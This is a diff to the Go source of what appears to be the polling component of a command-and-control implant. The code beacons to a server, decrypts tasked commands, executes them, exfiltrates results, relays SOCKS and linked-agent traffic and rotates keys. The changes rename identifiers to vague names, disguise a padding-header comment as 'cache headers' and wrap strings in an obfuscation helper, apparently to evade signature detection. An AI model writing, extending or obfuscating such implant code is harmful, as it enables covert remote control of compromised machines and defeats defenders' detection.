@@ -23,8 +23,8 @@ import (
 	"time"
 )
 
-// CommsTemplate stores communications-related template strings received from server
-type CommsTemplate struct {
+// PCfg stores communications-related template strings received from server
+type PCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -54,8 +54,8 @@ const (
 	idxPollHandshakeResp = 728
 )
 
-// Global comms template storage (uses SecureTemplate for memory zeroing)
-var globalCommsTpl *SecureTemplate
+// Global comms template storage (uses SafeTemplate for memory zeroing)
+var globalCommsTpl *SafeTemplate
 
 // commsTpl safely retrieves a template string by index
 func commsTpl(idx int) string {
@@ -70,7 +70,7 @@ func getPollStr(idx int) string {
 // Malleable field values - injected at build time via ldflags
 // These can be customized in config.toml to avoid structural fingerprinting
 var (
-	MALLEABLE_REKEY_COMMAND             = "rekey_required"
+	MALLEABLE_REKEY_COMMAND             = "kr"
 	MALLEABLE_REKEY_STATUS_FIELD        = "status"
 	MALLEABLE_REKEY_DATA_FIELD          = "data"
 	MALLEABLE_REKEY_ID_FIELD            = "command_db_id"
@@ -84,16 +84,16 @@ var (
 	MALLEABLE_SOCKS_RESP_FIELD          = "sr"
 )
 
-// PollConfig holds the configuration for polling behavior
-type PollConfig struct {
+// SyncConfig holds the configuration for polling behavior
+type SyncConfig struct {
 	GetURL          string
 	PostURL         string
-	DecryptedValues *DecryptedConfig
+	DecryptedValues *ResolvedConfig
 }
 
 var (
-	commandQueue    *CommandQueue
-	resultManager   *ResultManager
+	commandQueue    *WorkQueue
+	resultManager   *OutputManager
 	currentPolling  *sync.WaitGroup
 	pollingShutdown chan struct{}
 	pollingMutex    sync.Mutex
@@ -128,8 +128,8 @@ func deriveXORKey(clientID, secret string) []byte {
 	return hash[:32]
 }
 
-// xorDecryptBytes decrypts byte array using XOR
-func xorDecryptBytes(data []byte, key []byte) []byte {
+// decBytes decrypts byte array using XOR
+func decBytes(data []byte, key []byte) []byte {
 	result := make([]byte, len(data))
 	for i := 0; i < len(data); i++ {
 		result[i] = data[i] ^ key[i%len(key)]
@@ -138,7 +138,7 @@ func xorDecryptBytes(data []byte, key []byte) []byte {
 }
 
 // tryDecryptResponse attempts to find and decrypt the XOR encrypted field
-func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
+func tryDecryptResponse(rawResponse map[string]interface{}, cfgKey []byte) (map[string]interface{}, error) {
 	// Try each field in the response
 	for _, fieldValue := range rawResponse {
 		// Skip non-string fields
@@ -154,7 +154,7 @@ func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[
 		}
 
 		// Try to XOR decrypt
-		decrypted := xorDecryptBytes(encrypted, xorKey)
+		decrypted := decBytes(encrypted, cfgKey)
 
 		// Try to parse as JSON
 		var response map[string]interface{}
@@ -187,16 +187,16 @@ func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.R
 // sendResults sends encrypted results to the server
 func sendResults(encryptedData string, customHeaders map[string]string) error {
 	// Get current URLs dynamically
-	_, postURL := handshakeManager.GetCurrentURLs()
+	_, postURL := handshakeManager.getCurrentURLs()
 	decryptedValues := handshakeManager.decryptedValues
 
 	// Get transform DataBlocks
-	_, postClientIDDataBlock, postDataDataBlock, _ := handshakeManager.GetTransformDataBlocks()
+	_, postClientIDDataBlock, postDataDataBlock, _ := handshakeManager.getTransformDataBlocks()
 
 	// Get the custom POST method from decrypted values
 	method := decryptedValues.PostMethod
 	if method == "" {
-		method = geMethodPost // Fallback to default
+		method = secVal(geMethodPost) // Fallback to default
 	}
 
 	var bodyData []byte
@@ -250,20 +250,20 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		// For transformed data, use content type from decrypted values or default
 		contentType := decryptedValues.ContentType
 		if contentType != "" {
-			req.Header.Set(httpHeaderContentType, contentType)
+			req.Header.Set(secVal(httpHeaderContentType), contentType)
 		}
 	} else {
-		req.Header.Set(httpHeaderContentType, getPollStr(idxPollAppJson))
+		req.Header.Set(secVal(httpHeaderContentType), getPollStr(idxPollAppJson))
 	}
 
-	req.Header.Set(httpHeaderUserAgent, decryptedValues.UserAgent)
+	req.Header.Set(secVal(httpHeaderUserAgent), decryptedValues.UserAgent)
 
 	// Add padding length headers if random transforms were used
 	if prependLen > 0 {
-		req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
+		req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", prependLen))
 	}
 	if appendLen > 0 {
-		req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
+		req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", appendLen))
 	}
 
 	// Apply clientID transforms if configured
@@ -280,12 +280,12 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		locType, _ := parseOutput(dataOutputLocation)
 		if locType != "body" {
 			placeInLocation(req, dataOutputLocation, transformedData, prependLen, appendLen)
-			// Set X-Pad headers for non-body POST data (after placeInLocation to not be overwritten)
+			// Set cache headers for non-body POST data (after placeInLocation to not be overwritten)
 			if prependLen > 0 {
-				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
+				req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", prependLen))
 			}
 			if appendLen > 0 {
-				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
+				req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", appendLen))
 			}
 		}
 	}
@@ -311,14 +311,14 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 }
 
 // doPoll performs a single poll cycle
-func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
-	getURL, _ := handshakeManager.GetCurrentURLs()
+func doPoll(secureComms *SecChan, customHeaders map[string]string) error {
+	getURL, _ := handshakeManager.getCurrentURLs()
 	decryptedValues := handshakeManager.decryptedValues
-	getClientIDDataBlock, _, _, responseDataDataBlock := handshakeManager.GetTransformDataBlocks()
+	getClientIDDataBlock, _, _, responseDataDataBlock := handshakeManager.getTransformDataBlocks()
 
 	method := decryptedValues.GetMethod
 	if method == "" {
-		method = geMethodGet // Fallback to default
+		method = secVal(geMethodGet) // Fallback to default
 	}
 
 	// Create the request with custom method
@@ -341,7 +341,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	// Set headers
-	req.Header.Set(httpHeaderUserAgent, decryptedValues.UserAgent)
+	req.Header.Set(secVal(httpHeaderUserAgent), decryptedValues.UserAgent)
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
@@ -368,8 +368,8 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Check if response transforms are configured
 	if responseDataDataBlock != nil && len(responseDataDataBlock.Transforms) > 0 {
 		// Get padding lengths from response headers
-		prependLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadPre))
-		appendLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadApp))
+		prependLen, _ := strconv.Atoi(resp.Header.Get(secVal(httpHeaderPadPre)))
+		appendLen, _ := strconv.Atoi(resp.Header.Get(secVal(httpHeaderPadApp)))
 
 		// Check output location - extract from header/cookie if not body
 		locType, locName := parseOutput(responseDataDataBlock.Output)
@@ -414,9 +414,9 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 		// After reversing transforms, body is raw XOR-encrypted bytes
 		// XOR decrypt directly (not base64 encoded)
-		currentSecret := secureComms.GetDecryptionSecret()
-		xorKey := deriveXORKey(getClientID(), currentSecret)
-		decrypted := xorDecryptBytes(body, xorKey)
+		currentSecret := secureComms.getDecryptionSecret()
+		cfgKey := deriveXORKey(getClientID(), currentSecret)
+		decrypted := decBytes(body, cfgKey)
 
 		// Parse the decrypted JSON
 		if err := json.Unmarshal(decrypted, &responseMap); err != nil {
@@ -440,10 +440,10 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			// Likely encrypted, try to decrypt
 
 			// Get current secret from secureComms
-			currentSecret := secureComms.GetDecryptionSecret()
-			xorKey := deriveXORKey(getClientID(), currentSecret)
+			currentSecret := secureComms.getDecryptionSecret()
+			cfgKey := deriveXORKey(getClientID(), currentSecret)
 
-			decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
+			decryptedMap, err := tryDecryptResponse(rawResponse, cfgKey)
 			if err != nil {
 				// Couldn't decrypt, use raw response
 				responseMap = rawResponse
@@ -490,21 +490,21 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			commandDBID, _ = strconv.Atoi(v)
 		}
 
-		// Execute rekey command directly without decryption
+		// execute rekey command directly without decryption
 
 		// Create result for the rekey command first (before triggering rekey)
-		rekeyResult := &CommandResult{
-			Command: Command{
-				Command:     getPollStr(idxPollRekey),
-				CommandDBID: commandDBID,
-				AgentID:     getClientID(),
+		rekeyResult := &OpResult{
+			Cmd: Msg{
+				Cmd:     getPollStr(idxPollRekey),
+				DID: commandDBID,
+				AID:     getClientID(),
 			},
-			CompletedAt: time.Now().Format(time.RFC3339),
+			Done: time.Now().Format(time.RFC3339),
 			Output:      Succ(S15),
-			ExitCode:    0,
+			EC:    0,
 		}
 
-		resultManager.AddResult(rekeyResult)
+		resultManager.addResult(rekeyResult)
 
 		if rekeyInProgress.CompareAndSwap(false, true) {
 			go func() {
@@ -523,7 +523,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 	// Normal encrypted command processing
 	if responseData != "" {
-		decrypted, err := secureComms.DecryptMessage(responseData)
+		decrypted, err := secureComms.decryptMessage(responseData)
 		if err != nil {
 			// Log decryption failure which might indicate key desync
 
@@ -539,34 +539,34 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 
 
-		commandQueue.AddCommands(decrypted)
+		commandQueue.addCommands(decrypted)
 
 		for {
-			result, err := commandQueue.ProcessNextCommand()
+			result, err := commandQueue.processNextCommand()
 			if err != nil {
 				continue
 			}
 			if result == nil {
 				break
 			}
-			resultManager.AddResult(result)
+			resultManager.addResult(result)
 		}
-		secureComms.RotateSecret()
+		secureComms.rotateSecret()
 	}
 
 	return nil
 }
 
 // startPolling initializes and starts the polling routine
-func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
+func startPolling(config SyncConfig, sysInfo *NR) error {
 
-	// Use the SecureComms from HandshakeManager instead of creating a new one
-	secureComms := handshakeManager.GetSecureComms()
+	// Use the SecChan from ConnMgr instead of creating a new one
+	secureComms := handshakeManager.getSecureComms()
 	if secureComms == nil {
 		// Fallback to creating new one if not available (shouldn't happen)
 		secureComms = NewSecureComms(
 			handshakeManager.decryptedValues.Secret,
-			sysInfo.AgentInfo.Seed,
+			sysInfo.DT.SD,
 		)
 	}
 
@@ -625,23 +625,23 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			}
 
 			// Collect link data from connected TCP agents (if any)
-			linkData := GetLinkManager().GetOutboundData()
+			linkData := getLinkManager().getOutboundData()
 			// Collect link handshake data (for new linked agents, sent via "lh" field)
-			linkHandshake := GetLinkManager().GetHandshakeData()
+			linkHandshake := getLinkManager().getHandshakeData()
 			// Collect unlink notifications (routing IDs that have been disconnected)
-			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
+			unlinkNotifications := getLinkManager().getUnlinkNotifications()
 
 			// Check for SOCKS HTTP responses
-			hasSocksResp := HasPendingSocksResponses()
+			hasSocksResp := hasPendingSocksResponses()
 
 			// Handle pending results before sleep
-			hasResults := resultManager.HasResults()
+			hasResults := resultManager.hasResults()
 			hasLinkData := len(linkData) > 0
 			hasLinkHandshake := linkHandshake != nil
 			hasUnlinkNotifications := len(unlinkNotifications) > 0
 
 			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResp {
-				results := resultManager.GetPendingResults()
+				results := resultManager.getPendingResults()
 				payload := make(map[string]interface{})
 				payload[getPollStr(idxPollAgentId)] = getClientID()
 
@@ -653,7 +653,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				}
 				if hasLinkHandshake {
 					// Send handshake as single object via "lh" field
-					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
+					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.toMalleableMap()
 				}
 				if hasUnlinkNotifications {
 					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
@@ -667,7 +667,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 				jsonData, err := json.Marshal(payload)
 				if err == nil {
-					encrypted, err := secureComms.EncryptMessage(string(jsonData))
+					encrypted, err := secureComms.encryptMessage(string(jsonData))
 					if err == nil {
 						if err := sendResults(encrypted, customHeaders); err == nil {
 							for _, result := range results {
@@ -679,7 +679,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 									commandQueue.mu.Unlock()
 								}
 							}
-							secureComms.RotateSecret()
+							secureComms.rotateSecret()
 						}
 					}
 				}
@@ -713,8 +713,8 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 	return nil
 }
 
-// StopPolling signals the current polling routine to stop and waits for it to finish
-func StopPolling() {
+// stopPolling signals the current polling routine to stop and waits for it to finish
+func stopPolling() {
 
 	pollingMutex.Lock()
 	if pollingShutdown != nil {
